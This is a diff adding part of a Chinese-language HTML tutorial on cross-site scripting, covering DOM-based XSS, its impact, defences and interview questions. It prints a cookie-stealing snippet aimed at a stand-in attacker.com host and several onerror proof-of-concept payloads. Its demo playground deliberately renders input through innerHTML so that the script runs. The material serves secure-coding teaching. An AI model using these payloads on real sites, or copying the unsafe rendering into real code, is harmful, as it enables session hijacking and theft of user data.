+                            </p>
+                        </article>
+                        <article id="dom-xss">
+                            <h3 class="head3">DOM型 XSS (DOM-based XSS)</h3>
+                            <p class="text-gray-600 mb-3">这种XSS比较特殊，漏洞存在于客户端脚本中，而不是服务器端。</p>
+                            <h4 class="head3">背景（问题）：</h4>
+                            <p class="text-gray-700 mb-3">
+                                Web应用程序的 <strong>客户端JavaScript代码</strong> 在处理来自用户可控数据源（如URL的片段标识符 <code>#</code>
+                                后面的内容，或者 <code>document.location</code>、<code>document.URL</code>
+                                等）时，<strong>不安全地修改了页面的DOM结构</strong>（比如使用
+                                <code>innerHTML</code>、<code>document.write</code>）。
+                            </p>
+                            <h4 class="head3">技术（是什么）：</h4>
+                            <p class="text-gray-700 mb-3">
+                                恶意脚本并不经过服务器处理，而是直接在浏览器端被页面的合法JavaScript代码获取并执行。服务器可能完全不知道这次攻击的发生。
+                            </p>
+                            <div class="mermaid my-3 p-2 bg-gray-100 rounded border border-gray-200">
+                                sequenceDiagram
+                                participant A as 攻击者
+                                participant V as 受害者
+                                participant VB as 受害者浏览器 (JS引擎 & DOM)
+                                participant W as Web应用/服务器
+
+                                A->>V: 诱导访问恶意URL (如含恶意 #hash)
+                                V->>VB: 访问URL
+                                VB->>W: (可选) 请求页面资源
+                                W-->>VB: (可选) 返回页面HTML/JS
+                                VB->>VB: 客户端JS读取URL (如 location.hash)
+                                Note right of VB: JS代码存在漏洞 (如使用innerHTML)
+                                VB->>VB: 使用URL数据不安全地修改DOM
+                                VB->>VB: 浏览器解析修改后的DOM, 执行注入的脚本
+                                Note over VB: 攻击发生在客户端, 服务器可能不知情
+                            </div>
+                            <h4 class="head3">如何发生（举例）：</h4>
+                            <ol class="list-decimal list-inside space-y-1 text-gray-700 mb-3 pl-4">
+                                <li>页面有一个JavaScript功能，会读取URL的hash值（#后面的部分）并在页面上显示欢迎信息，代码类似：
+                                    <pre><code class="language-javascript">let name = window.location.hash.substring(1); // 获取#后的内容
+document.getElementById('welcome').innerHTML = "Welcome, " + name;</code></pre>
+                                </li>
+                                <li>攻击者构造恶意URL：<code>https://example.com/page#&lt;img src=x onerror=alert('DOM XSS')&gt;</code>
+                                </li>
+                                <li>用户访问此URL。</li>
+                                <li>页面加载后，客户端JavaScript执行，读取hash值
+                                    <code>&lt;img src=x onerror=alert('DOM XSS')&gt;</code>。</li>
+                                <li>JavaScript使用 <code>innerHTML</code> 将这段字符串写入到 <code>id="welcome"</code> 的元素中。</li>
+                                <li>浏览器解析这段HTML，创建了一个无效的img标签，触发了<code>onerror</code>事件，执行了恶意脚本。</li>
+                            </ol>
+                            <h4 class="head3">如何解决（预防）：</h4>
+                            <p class="text-gray-700">
+                                关键在于 <strong>避免使用危险的JavaScript方法来处理用户可控的数据去修改DOM</strong>。
+                            <ul class="list-disc list-inside ml-4 mt-2 space-y-1">
+                                <li>优先使用更安全的方法，如 <code>.textContent</code>、<code>.innerText</code> 来设置文本内容，而不是
+                                    <code>.innerHTML</code>。</li>
+                                <li>如果必须使用 <code>innerHTML</code>
+                                    或类似方法，确保传入的数据已经过严格的净化（Sanitization），移除或编码危险的HTML标签和属性。可以使用成熟的DOM净化库（如 DOMPurify）。
+                                </li>
+                                <li>对所有从URL、Storage等读取并在DOM中使用的数据源保持警惕。</li>
+                            </ul>
+                            </p>
+                        </article>
+                    </section>
+
+                    <section id="xss-impact" class="content-card">
+                        <h2 class="head2"><span class="material-icons">dangerous</span> XSS的危害</h2>
+                        <p class="text-gray-700 mb-4">
+                            不要小看XSS漏洞，它可能造成的后果非常严重，远不止弹出一个警告框那么简单。
+                        </p>
+                        <ul class="list-disc list-inside space-y-3 text-gray-700 pl-4">
+                            <li>
+                                <strong class="text-red-600">窃取敏感信息：</strong> 最常见的危害是窃取用户的Cookie（尤其是Session
+                                Cookie）。攻击者拿到Cookie后，可能无需密码就能登录用户的账户，这称为“会话劫持”（Session
+                                Hijacking）。也可以窃取LocalStorage/SessionStorage中的数据、浏览器自动填充的表单数据等。
+                                <pre><code class="language-javascript">// 示例：窃取Cookie并发送到攻击者服务器
+var img = new Image();
+img.src = 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie);</code></pre>
+                            </li>
+                            <li><strong class="text-red-600">修改网页内容/钓鱼欺诈：</strong>
+                                攻击者可以利用XSS动态修改页面内容，例如插入虚假的登录框骗取用户密码，或者显示错误的信息误导用户。</li>
+                            <li><strong class="text-red-600">网络钓鱼（Phishing）：</strong> 结合其他社会工程学手段，诱导用户在被注入脚本的页面上输入敏感信息。
+                            </li>
+                            <li><strong class="text-red-600">执行未授权操作：</strong> 模拟用户在网站上执行操作，如发帖、转账、删除数据等。</li>
+                            <li><strong class="text-red-600">键盘记录：</strong> 注入脚本监听用户的键盘输入，窃取密码或其他机密信息。</li>
+                            <li><strong class="text-red-600">蠕虫传播：</strong>
+                                构造XSS蠕虫，使得用户在浏览被感染页面时，自动将恶意脚本传播给其他用户（例如自动发帖/发私信包含恶意代码）。</li>
+                            <li><strong class="text-red-600">绕过内容安全策略（CSP）：</strong> 在某些配置不当的情况下，XSS可能被用来绕过CSP限制。</li>
+                        </ul>
+                        <div class="alert alert-danger mt-6">
+                            <span class="material-icons">error</span>
+                            <span><strong>总结：</strong>
+                                XSS的危害取决于攻击者脚本的能力以及被攻击网站的功能。对于功能复杂、涉及敏感信息的网站（如银行、电商、社交网站），XSS漏洞的威胁极大。</span>
+                        </div>
+                    </section>
+
+                    <section id="xss-prevention" class="content-card">
+                        <h2 class="head2"><span class="material-icons">security</span> 如何防御XSS？</h2>
+                        <p class="text-gray-700 mb-6">
+                            防御XSS需要采取纵深防御策略，结合多种手段。核心原则是：<strong>不信任任何用户输入，并对输出进行恰当处理。</strong>
+                        </p>
+                        <article id="input-validation" class="mb-6">
+                            <h3 class="head3">输入验证与过滤 (Input Validation/Filtering)</h3>
+                            <p class="text-gray-700 mb-3">在接收用户输入时，根据业务逻辑进行检查和限制。</p>
+                            <ul class="list-disc list-inside space-y-2 text-gray-700 pl-4 mb-3">
+                                <li><strong>类型检查：</strong> 期望是数字的地方，就只接受数字。</li>
+                                <li><strong>长度限制：</strong> 限制输入的最大长度。</li>
+                                <li><strong>格式检查：</strong> 如邮箱、手机号、URL等应符合特定格式。</li>
+                                <li><strong>白名单过滤：</strong> 只允许已知安全的字符或标签通过。例如，富文本编辑器通常采用白名单过滤允许的HTML标签和属性。</li>
+                                <li><strong>黑名单过滤（不推荐）：</strong> 尝试阻止已知的危险字符或模式。这种方法容易被绕过，不建议作为主要防御手段。</li>
+                            </ul>
+                            <div class="alert alert-info">
+                                <span class="material-icons">info</span>
+                                <span>输入验证是第一道防线，有助于减少无效或恶意数据进入系统，但
+                                    <strong>不能完全依赖输入验证来防御XSS</strong>，因为很难穷尽所有可能的攻击向量，且有时业务需求允许输入特殊字符。</span>
+                            </div>
+                        </article>
+                        <article id="output-encoding" class="mb-6">
+                            <h3 class="head3">输出编码 (Output Encoding)</h3>
+                            <p class="text-gray-700 mb-3">
+                                <strong>这是防御XSS最核心、最有效的手段。</strong> 在将数据输出到HTML页面时，根据数据
+                                <strong>最终要插入的位置（上下文）</strong>，对特殊字符进行编码，使其失去原有的特殊含义，被浏览器当作普通文本处理。
+                            </p>
+                            <h4 class="head3">常见的输出上下文及编码方式：</h4>
+                            <ul class="list-disc list-inside space-y-2 text-gray-700 pl-4 mb-3">
+                                <li>
+                                    <strong>HTML 实体编码 (HTML Entity Encoding):</strong> 用于在 HTML 标签内容（如
+                                    <code>&lt;div&gt;这里&lt;/div&gt;</code>）或 HTML 属性值（如
+                                    <code>&lt;input value="这里"&gt;</code>）中输出数据。
+                                    <ul class="list-circle list-inside ml-4">
+                                        <li><code>&lt;</code> 编码为 <code>&amp;lt;</code></li>
+                                        <li><code>&gt;</code> 编码为 <code>&amp;gt;</code></li>
+                                        <li><code>&amp;</code> 编码为 <code>&amp;amp;</code></li>
+                                        <li><code>"</code> 编码为 <code>&amp;quot;</code></li>
+                                        <li><code>'</code> 编码为 <code>&amp;#39;</code> (或 <code>&amp;apos;</code>)</li>
+                                    </ul>
+                                    <pre><code>// 原始输入: &lt;script&gt;alert(1)&lt;/script&gt;
+// HTML内容编码后: &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;
+// HTML属性编码后 (假设在双引号属性中): &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</code></pre>
+                                </li>
+                                <li>
+                                    <strong>JavaScript 编码 (JavaScript Encoding):</strong> 用于在 JavaScript
+                                    代码块中输出数据，特别是字符串变量中。需要对可能中断JavaScript字符串或执行代码的字符进行转义，通常使用反斜杠 <code>\</code>。
+                                    <pre><code class="language-javascript">// 原始输入: '; alert('XSS'); //
+// JavaScript 编码后 (放入单引号字符串): \'; alert(\'XSS\'); //
+let username = '\'; alert(\'XSS\'); //';</code></pre>
+                                    <p class="text-sm text-gray-600 mt-1">注意：在HTML事件处理器（如 <code>onclick="..."</code>）或
+                                        <code>javascript:</code>
+                                        URL中输出数据时，情况更复杂，需要同时考虑HTML和JavaScript的编码规则，通常应避免在这种上下文中直接插入不可信数据。</p>
+                                </li>
+                                <li><strong>CSS 编码 (CSS Encoding):</strong> 用于在 CSS 样式或 <code>&lt;style&gt;</code>
+                                    标签中输出数据。需要对CSS元字符进行转义。相对少见，但也要注意。</li>
+                                <li><strong>URL 编码 (URL Encoding):</strong> 用于在 URL 的查询参数或路径部分输出数据。使用百分号编码（如
+                                    <code>%3C</code> 代表 <code>&lt;</code>）。</li>
+                            </ul>
+                            <div class="alert alert-success">
+                                <span class="material-icons">check_circle</span>
+                                <span><strong>关键原则：</strong> 对所有动态输出到页面的数据，都要根据其 <strong>确切的输出位置</strong>
+                                    选择正确的编码方式。许多现代Web框架和模板引擎（如React, Vue, Angular, Jinja2,
+                                    EJS等）会自动进行HTML实体编码，但开发者仍需理解原理，并在必要时手动处理或配置。</span>
+                            </div>
+                        </article>
+                        <article id="csp" class="mb-6">
+                            <h3 class="head3">内容安全策略 (Content Security Policy, CSP)</h3>
+                            <p class="text-gray-700 mb-3">
+                                CSP 是一种通过 HTTP 响应头声明的安全策略，用于告诉浏览器哪些来源的资源（脚本、样式、图片、字体等）是可信的，允许加载和执行。
+                            </p>
+                            <p class="text-gray-700 mb-3">
+                                它可以极大地限制 XSS 攻击的发生和危害，即使攻击者成功注入了脚本，CSP 也可以阻止其执行或限制其能力（例如阻止连接到恶意服务器）。
+                            </p>
+                            <h4 class="head3">常用指令示例：</h4>
+                            <pre><code class="language-http">Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; img-src 'self' data:; style-src 'self' 'unsafe-inline'; object-src 'none'; report-uri /csp-violation-report-endpoint;</code></pre>
+                            <ul class="list-disc list-inside space-y-1 text-gray-700 pl-4 mb-3">
+                                <li><code>default-src 'self'</code>: 默认只允许加载同源资源。</li>
+                                <li><code>script-src 'self' https://trusted-cdn.com</code>: 只允许加载同源脚本和来自
+                                    <code>trusted-cdn.com</code> 的脚本。禁止内联脚本
+                                    (<code>&lt;script&gt;...&lt;/script&gt;</code>) 和 <code>eval()</code>。</li>
+                                <li><code>img-src 'self' data:</code>: 允许加载同源图片和 data URI 形式的图片。</li>
+                                <li><code>style-src 'self' 'unsafe-inline'</code>: 允许同源样式和内联样式 (<code>style="..."</code>
+                                    或 <code>&lt;style&gt;...&lt;/style&gt;</code>)。注意：<code>'unsafe-inline'</code>
+                                    会降低安全性，应尽量避免。</li>
+                                <li><code>object-src 'none'</code>: 禁止加载插件（如 Flash）。</li>
+                                <li><code>report-uri /csp-violation...</code>: 将违规报告发送到指定端点。</li>
+                            </ul>
+                            <div class="alert alert-info">
+                                <span class="material-icons">info</span>
+                                <span>配置 CSP 需要仔细规划，避免阻止合法的资源加载。可以使用 <code>Content-Security-Policy-Report-Only</code>
+                                    头来测试策略而不强制执行。CSP 是防御 XSS 的一道强力屏障。</span>
+                            </div>
+                        </article>
+                        <article id="httponly" class="mb-6">
+                            <h3 class="head3">HttpOnly Cookie</h3>
+                            <p class="text-gray-700 mb-3">
+                                为敏感的 Cookie（特别是会话标识 Cookie）设置 <code>HttpOnly</code> 属性。
+                            </p>
+                            <pre><code class="language-http">Set-Cookie: SESSIONID=xyzabc; Path=/; HttpOnly; Secure; SameSite=Lax</code></pre>
+                            <p class="text-gray-700 mb-3">
+                                设置了 <code>HttpOnly</code> 属性的 Cookie 不能通过客户端
+                                JavaScript（<code>document.cookie</code>）访问。这可以有效防止 XSS 攻击者通过注入脚本来窃取用户的会话
+                                Cookie，从而大大降低会话劫持的风险。
+                            </p>
+                            <div class="alert alert-success">
+                                <span class="material-icons">check_circle</span>
+                                <span>虽然 <code>HttpOnly</code> 不能阻止 XSS 漏洞本身，但它能有效减轻 XSS 攻击中最常见的危害之一。建议对所有不需被 JavaScript
+                                    访问的 Cookie 都设置此属性。同时配合 <code>Secure</code> 属性（强制 Cookie 只在 HTTPS 连接下传输）和
+                                    <code>SameSite</code> 属性（防御 CSRF）增强安全性。</span>
+                            </div>
+                        </article>
+                        <article id="frameworks" class="mb-6">
+                            <h3 class="head3">使用安全框架/库</h3>
+                            <p class="text-gray-700 mb-3">
+                                现代的 Web 开发框架（如 React, Vue, Angular, Django, Ruby on Rails, Spring 等）通常内置了对抗 XSS 的机制。
+                            </p>
+                            <ul class="list-disc list-inside space-y-2 text-gray-700 pl-4 mb-3">
+                                <li><strong>自动编码：</strong> 许多模板引擎默认会对输出到 HTML 的数据进行 HTML 实体编码。例如 React 的 JSX 默认会编码花括号
+                                    <code>{}</code> 中的变量。</li>
+                                <li><strong>上下文感知编码：</strong> 一些框架能根据输出上下文自动选择合适的编码方式。</li>
+                                <li><strong>DOM 净化库：</strong> 对于需要允许用户输入富文本（HTML）的场景，可以使用专门的库（如 <a
+                                        href="https://github.com/cure53/DOMPurify" target="_blank"
+                                        rel="noopener noreferrer"
+                                        class="text-blue-600 hover:underline">DOMPurify</a>）来清理和过滤掉危险的标签和属性。</li>
+                            </ul>
+                            <div class="alert alert-info">
+                                <span class="material-icons">info</span>
+                                <span>依赖框架的内置保护是好事，但理解其工作原理和局限性同样重要。不要盲目信任，了解何时需要手动干预或进行额外配置。例如，当使用
+                                    <code>dangerouslySetInnerHTML</code> (React) 或 <code>v-html</code> (Vue)
+                                    时，框架的自动保护会被绕过，开发者需要自己承担安全责任。</span>
+                            </div>
+                        </article>
+                        <article id="advanced-defense">
+                            <h3 class="head3">进阶防御技术与最佳实践
+                                <span class="level-tag level-tag-advanced">进阶</span>
+                            </h3>
+                            <p class="text-gray-700 mb-3">除了上述核心方法，还有一些较新或更深入的技术可以增强 XSS 防御：</p>
+                            <ul class="list-disc list-inside space-y-2 text-gray-700 pl-4 mb-3">
+                                <li>
+                                    <strong>Trusted Types:</strong>
+                                    <p class="text-sm text-gray-600 mt-1">一项较新的浏览器安全特性，旨在从根本上消除 DOM XSS。它要求开发者在使用可能导致
+                                        XSS 的 DOM 操作（如 <code>innerHTML</code>, <code>script.src</code>）时，必须传入经过特定策略处理过的
+                                        "Trusted Type" 对象，而不是普通字符串。这强制开发者在代码层面处理不安全的数据流。</p>
+                                    <pre><code class="language-javascript">// 示例 (需要配置 Trusted Types 策略)
+const policy = trustedTypes.createPolicy('myPolicy', {
+  createHTML: (input) => DOMPurify.sanitize(input) // 使用 DOMPurify 创建 TrustedHTML
+});
+element.innerHTML = policy.createHTML(userInput); // 必须使用策略处理</code></pre>
+                                    <p class="text-xs text-gray-500 mt-1">目前需要显式启用和配置，但代表了未来防御 DOM XSS 的重要方向。</p>
+                                </li>
+                                <li>
+                                    <strong>DOMPurify 深度应用:</strong>
+                                    <p class="text-sm text-gray-600 mt-1">在使用 DOMPurify
+                                        等净化库时，不仅仅是简单调用，还需要根据业务需求精细配置允许的标签、属性和 URI 协议。例如，严格限制 <code>style</code> 属性，禁用
+                                        <code>javascript:</code> 等伪协议。</p>
+                                    <pre><code class="language-javascript">const cleanHtml = DOMPurify.sanitize(dirtyHtml, {
+  USE_PROFILES: { html: true }, // 允许基本的 HTML 标签
+  FORBID_TAGS: ['script', 'iframe', 'object', 'embed'], // 禁止危险标签
+  FORBID_ATTR: ['onerror', 'onload', 'style'] // 禁止危险属性
+});</code></pre>
+                                </li>
+                                <li>
+                                    <strong>服务器端模板引擎的上下文感知:</strong>
+                                    <p class="text-sm text-gray-600 mt-1">现代服务器端模板引擎（如 Go 的 html/template,
+                                        Jinja2）通常具备上下文感知能力，能根据变量输出的位置（HTML 标签内、属性内、JS 内）自动应用不同的编码规则，比简单的 HTML 实体编码更安全。
+                                    </p>
+                                </li>
+                                <li>
+                                    <strong>其他安全头部:</strong>
+                                    <p class="text-sm text-gray-600 mt-1">虽然不直接阻止 XSS 注入，但可以限制其影响。例如：</p>
+                                    <ul class="list-circle list-inside ml-4 text-xs">
+                                        <li><code>Referrer-Policy: strict-origin-when-cross-origin</code> 或
+                                            <code>no-referrer</code>：减少敏感信息通过 Referer 泄露给第三方。</li>
+                                        <li><code>Permissions-Policy</code> (原
+                                            Feature-Policy)：限制页面可以使用哪些浏览器特性（如摄像头、麦克风），即使 XSS 成功，也无法滥用这些权限。</li>
+                                    </ul>
+                                </li>
+                                <li>
+                                    <strong>安全开发流程与工具:</strong>
+                                    <p class="text-sm text-gray-600 mt-1">将安全融入开发流程，使用静态代码分析工具 (SAST) 和动态应用安全测试工具 (DAST)
+                                        扫描代码和应用，及早发现 XSS 漏洞。</p>
+                                </li>
+                            </ul>
+                            <div class="alert alert-info">
+                                <span class="material-icons">info</span>
+                                <span>这些进阶技术提供了更强的保护，但也可能需要更复杂的配置或对浏览器支持有要求。理解并适时采用它们，可以构建更健壮的安全防线。</span>
+                            </div>
+                        </article>
+                    </section>
+
+                    <section id="xss-playground" class="content-card">
+                        <h2 class="head2"><span class="material-icons">smart_toy</span> XSS Playground (无Iframe版)</h2>
+                        <div id="playground-setup" class="data-setup-area">
+                            <h3 class="head3" class="!mt-0 !mb-3 text-lg font-semibold">设置演示数据 (用于模拟)</h3>
+                            <p class="text-sm text-gray-600 mb-3">
+                                由于环境限制，浏览器可能没有现成的Cookie或LocalStorage数据。你可以在此手动设置一些模拟数据，以便在下方的 Playground 中尝试“窃取”。</p>
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-3">
+                                <div>
+                                    <label for="manual-cookie">模拟 Session Cookie 值:</label>
+                                    <input type="text" id="manual-cookie" placeholder="例如：session-abcxyz123"
+                                        class="text-sm">
+                                </div>
+                                <div>
+                                    <label for="manual-localstorage">模拟 LocalStorage 用户信息:</label>
+                                    <input type="text" id="manual-localstorage"
+                                        placeholder='例如：{"user":"test","role":"guest"}' class="text-sm">
+                                </div>
+                            </div>
+                            <button onclick="setManualData()" class="button">设置数据</button>
+                            <div id="data-display" class="data-display-area">
+                                <strong>当前页面数据:</strong><br>
+                                <span>Cookie: <code id="display-cookie">(未设置)</code></span><br>
+                                <span>LocalStorage (userInfo): <code id="display-localstorage">(未设置)</code></span>
+                            </div>
+                        </div>
+                        <div class="alert alert-danger mb-6">
+                            <span class="material-icons">gpp_bad</span>
+                            <div>
+                                <strong>警告：危险区域！</strong> 下方的“不安全输出”区域将直接使用 `innerHTML`
+                                插入内容到<b>当前页面</b>。这意味着您输入的代码将**真实执行**。请仅输入您理解的代码，避免执行潜在有害操作。
+                            </div>
+                        </div>
+                        <article id="playground-reflected" class="playground">
+                            <h3 class="head3" class="!mt-0 !mb-3 text-xl font-semibold">反射型 XSS 体验</h3>
+                            <p class="text-sm text-gray-600 mb-4">模拟搜索功能。在“不安全输出”区域直接嵌入输入。注意：浏览器CSP可能会给常见的注入消毒。</p>
+                            <div class="mb-4">
+                                <label for="reflected-input"
+                                    class="block text-sm font-medium text-gray-700 mb-1">输入搜索词:</label>
+                                <input type="text" id="reflected-input" name="query" class="mb-1"
+                                    placeholder="试试: <img src=x onerror=alert(document.cookie)>"
+                                    oninput="checkInput('reflected-input', 'reflected-feedback')">
+                                <div id="reflected-feedback" class="input-feedback"></div>
+                                <button onclick="simulateSearch()" class="button mt-2">模拟搜索</button>
+                            </div>
+                            <h4 class="head3" class="font-semibold text-gray-800">不安全的输出 (直接innerHTML - 脚本会执行):</h4>
+                            <div id="reflected-output-unsafe" class="output-area output-unsafe">初始内容...</div>
+                            <div class="alert alert-warning mt-2 text-sm"><span
+                                    class="material-icons">warning</span><span>此区域直接使用innerHTML，脚本会执行。</span></div>
+                            <h4 class="head3" class="font-semibold text-gray-800 mt-4">安全的输出 (HTML实体编码):</h4>
+                            <div id="reflected-output-safe" class="output-area output-safe">搜索结果将显示在这里...</div>
+                        </article>
+                        <article id="playground-stored" class="playground">
+                            <h3 class="head3" class="!mt-0 !mb-3 text-xl font-semibold">存储型 XSS 体验</h3>
+                            <p class="text-sm text-gray-600 mb-4">模拟评论区。“不安全输出”区域加载所有“不安全”评论。</p>
+                            <div class="mb-4">
+                                <label for="stored-input"
+                                    class="block text-sm font-medium text-gray-700 mb-1">发表评论:</label>
+                                <textarea id="stored-input" rows="3" class="mb-1"
+                                    placeholder="试试: <img src=x onerror=alert(localStorage.getItem('userInfo'))>"
+                                    oninput="checkInput('stored-input', 'stored-feedback')"></textarea>
+                                <div id="stored-feedback" class="input-feedback"></div>
+                                <button onclick="simulateComment()" class="button mt-2">提交评论</button>
+                                <button onclick="clearComments()" class="button secondary ml-2 mt-2">清空评论</button>
+                            </div>
+                            <h4 class="head3" class="font-semibold text-gray-800">评论列表 (模拟不安全存储与显示 - 直接innerHTML):</h4>
+                            <div id="stored-output-unsafe" class="output-area output-unsafe">
+                                <div><em>(暂无评论)</em></div>
+                            </div>
+                            <div class="alert alert-warning mt-2 text-sm"><span
+                                    class="material-icons">warning</span><span>此区域直接使用innerHTML渲染“未净化”评论，脚本会执行。</span>
+                            </div>
+                            <h4 class="head3" class="font-semibold text-gray-800 mt-4">评论列表 (模拟安全存储与显示):</h4>
+                            <div id="stored-output-safe" class="output-area output-safe">
+                                <div class="p-2 text-sm text-gray-500">(暂无评论)</div>
+                            </div>
+                        </article>
+                        <article id="playground-dom" class="playground">
+                            <h3 class="head3" class="!mt-0 !mb-3 text-xl font-semibold">DOM型 XSS 体验</h3>
+                            <p class="text-sm text-gray-600 mb-4">模拟客户端脚本读取 URL hash 并用 `innerHTML` 更新页面内容。</p>
+                            <p class="text-sm text-gray-600 mb-4">请修改浏览器地址栏URL，在末尾添加 <code>#</code>
+                                和一些内容，然后点击下面的“手动触发更新”按钮。例如：<br>
+                                <code>...#&lt;b&gt;Hello&lt;/b&gt;</code><br>
+                                <code>...#&lt;img src=x onerror="alert('DOM XSS - Cookie: ' + document.cookie)"&gt;</code>
+                            </p>
+                            <button onclick="simulateDOMUpdate()" class="button mb-4">手动触发更新</button>
+                            <h4 class="head3" class="font-semibold text-gray-800">不安全的DOM更新 (直接innerHTML - 脚本会执行):</h4>
+                            <div id="dom-output-unsafe" class="output-area output-unsafe">正在加载来自 URL Hash 的内容...</div>
+                            <div class="alert alert-warning mt-2 text-sm"><span
+                                    class="material-icons">warning</span><span>此区域直接使用innerHTML更新，脚本会执行。</span></div>
+                            <h4 class="head3" class="font-semibold text-gray-800 mt-4">安全的DOM更新 (使用 textContent):</h4>
+                            <div id="dom-output-safe" class="output-area output-safe">内容将根据URL的hash显示在这里...</div>
+                        </article>
+                        <article id="playground-dompurify" class="playground">
+                            <h3 class="head3" class="!mt-0 !mb-3 text-xl font-semibold">DOMPurify 净化体验</h3>
+                            <p class="text-sm text-gray-600 mb-4">演示如何使用 DOMPurify 库来清理用户输入的 HTML，移除潜在的 XSS 攻击代码，同时保留安全的
+                                HTML 标签。</p>
+                            <div class="mb-4">
+                                <label for="dompurify-input" class="block text-sm font-medium text-gray-700 mb-1">输入包含
+                                    HTML 的内容:</label>
+                                <textarea id="dompurify-input" rows="4" class="mb-1"
+                                    placeholder="试试: <b>加粗</b> <a href='javascript:alert(1)'>恶意链接</a> <img src=x onerror=alert('XSS')> <script>alert('script')</script>"
+                                    oninput="checkInput('dompurify-input', 'dompurify-feedback')"></textarea>
+                                <div id="dompurify-feedback" class="input-feedback"></div>
+                                <button onclick="simulatePurify()" class="button mt-2">使用 DOMPurify 清理并显示</button>
+                            </div>
+                            <h4 class="head3" class="font-semibold text-gray-800">净化后的输出 (使用 DOMPurify + innerHTML):</h4>
+                            <div id="dompurify-output-safe" class="output-area output-safe">净化后的内容将显示在这里...</div>
+                            <div class="alert alert-success mt-2 text-sm"><span
+                                    class="material-icons">check_circle</span><span>此区域使用 DOMPurify 清理输入后，再通过 innerHTML
+                                    插入。危险代码被移除。</span></div>
+                        </article>
+                    </section>
+
+                    <section id="xss-interview-prep" class="content-card">
+                        <h2 class="head2"><span class="material-icons">mic</span> 面试高频考点</h2>
+                        <p class="text-gray-700 mb-6">
+                            作为应届毕业生或初级全栈开发者，面试官通常会通过XSS相关问题来考察你的安全意识、基础知识掌握程度以及解决问题的能力。以下是一些常见的问题和考察点：
+                        </p>
+                        <div class="space-y-4">
+                            <details>
+                                <summary>1. 请解释一下什么是XSS攻击？它有什么危害？</summary>
+                                <div class="details-content">
+                                    <p><strong>考察点：</strong> 对XSS基本概念和主要危害的理解。</p>
+                                    <p><strong>回答思路：</strong></p>
+                                    <ul class="list-disc list-inside pl-4 space-y-1 mt-2">
+                                        <li><strong>定义：</strong> 清晰解释XSS是跨站脚本攻击，是由于Web应用信任了用户输入，将其作为代码执行导致的漏洞。</li>
+                                        <li><strong>核心原理：</strong> 强调是恶意脚本在用户浏览器中执行。</li>
+                                        <li><strong>主要危害：</strong>
+                                            列举几个关键危害，如会话劫持（窃取Cookie）、钓鱼欺诈、修改页面内容、键盘记录等。可以举例说明，比如拿到管理员Cookie就能登录后台。</li>
+                                        <li><strong>重要性：</strong> 强调其普遍性和严重性。</li>
+                                    </ul>
+                                </div>
+                            </details>
+                            <details>
+                                <summary>2. XSS有哪几种主要类型？它们之间有什么区别？</summary>
+                                <div class="details-content">
+                                    <p><strong>考察点：</strong> 对XSS分类的掌握，特别是它们在注入方式、存储和触发机制上的差异。</p>
+                                    <p><strong>回答思路：</strong></p>
+                                    <ul class="list-disc list-inside pl-4 space-y-1 mt-2">
+                                        <li><strong>列出类型：</strong>
+                                            存储型（Stored/Persistent）、反射型（Reflected/Non-Persistent）、DOM型（DOM-based）。</li>
+                                        <li><strong>存储型：</strong> 强调恶意脚本被 <strong>存储</strong>
+                                            在服务器端，影响所有访问该数据的用户。危害范围广，持续时间长。</li>
+                                        <li><strong>反射型：</strong> 强调恶意脚本通常在 <strong>URL</strong> 中，需要诱导用户点击，脚本被服务器
+                                            <strong>反射</strong> 回浏览器执行。一次性攻击为主。</li>
+                                        <li><strong>DOM型：</strong> 强调漏洞发生在 <strong>客户端</strong> JavaScript
+                                            代码中，通过修改DOM触发，服务器可能不知情。</li>
+                                        <li><strong>关键区别：</strong> 从“是否存储”、“触发方式”、“服务器是否参与（DOM型）”等角度对比。</li>
+                                    </ul>
+                                </div>
+                            </details>
+                            <details>
+                                <summary>3. 如何有效防御XSS攻击？（最重要的防御手段是什么？）</summary>
+                                <div class="details-content">
+                                    <p><strong>考察点：</strong> 对核心防御策略的理解和优先级排序。</p>
+                                    <p><strong>回答思路：</strong></p>
+                                    <ul class="list-disc list-inside pl-4 space-y-1 mt-2">
+                                        <li><strong>核心原则：</strong> “不信任用户输入，对输出进行编码”。</li>
+                                        <li><strong>最重要的手段：</strong> 强调 <strong>输出编码（Output Encoding）</strong>
+                                            是最根本、最有效的防御方法。解释其原理（将特殊字符转义，使其失去代码执行能力）。</li>
+                                        <li><strong>上下文感知：</strong>
+                                            提到编码需要根据输出的上下文（HTML内容、HTML属性、JavaScript、CSS、URL）选择正确的方式。</li>
+                                        <li><strong>其他辅助手段：</strong>
+                                            <ul class="list-circle list-inside ml-4 mt-1">
+                                                <li>输入验证/过滤（作为第一道防线）。</li>
+                                                <li>内容安全策略（CSP）（强大的补充防御，限制脚本来源和行为）。</li>
+                                                <li>HttpOnly Cookie（减轻会话劫持风险）。</li>
+                                                <li>使用安全的框架/库及其内置机制。</li>
+                                                <li>HTML 净化（如 DOMPurify）。</li>
+                                                <li>Trusted Types。</li>
+                                            </ul>
+                                        </li>
+                                        <li><strong>纵深防御：</strong> 强调单一手段不够，需要多层防御结合。</li>
+                                    </ul>
+                                </div>
+                            </details>
+                            <details>
+                                <summary>4. 输入过滤/验证和输出编码有什么区别？为什么说输出编码更重要？</summary>
+                                <div class="details-content">
+                                    <p><strong>考察点：</strong> 对两种主要防御手段的定位和作用的清晰认识。</p>
+                                    <p><strong>回答思路：</strong></p>
+                                    <ul class="list-disc list-inside pl-4 space-y-1 mt-2">
+                                        <li><strong>输入验证：</strong> 发生在数据 <strong>进入</strong> 系统时。目的是确保数据的
+                                            <strong>格式、类型、长度</strong> 符合预期，或者过滤掉已知的 <strong>危险模式</strong>。它更侧重于保证数据的
+                                            <strong>完整性和业务合规性</strong>，顺带提供一定的安全过滤。</li>
+                                        <li><strong>输出编码：</strong> 发生在数据 <strong>展示给用户</strong> 时。目的是确保数据在
+                                            <strong>特定的输出上下文</strong> 中被当作 <strong>纯文本</strong> 对待，而不是可执行代码。它直接针对XSS的
+                                            <strong>执行阶段</strong> 进行防御。</li>
+                                        <li><strong>为什么输出编码更重要：</strong>
+                                            <ul class="list-circle list-inside ml-4 mt-1">
+                                                <li><strong>根本性：</strong> XSS的本质是恶意代码被执行，输出编码直接阻止执行。</li>
+                                                <li><strong>可靠性：</strong>
+                                                    输入验证很难穷尽所有攻击向量（编码绕过、新攻击手法等），且业务需求可能允许输入特殊字符。输出编码则与输入内容无关，只要在输出时正确编码即可保证安全。
+                                                </li>
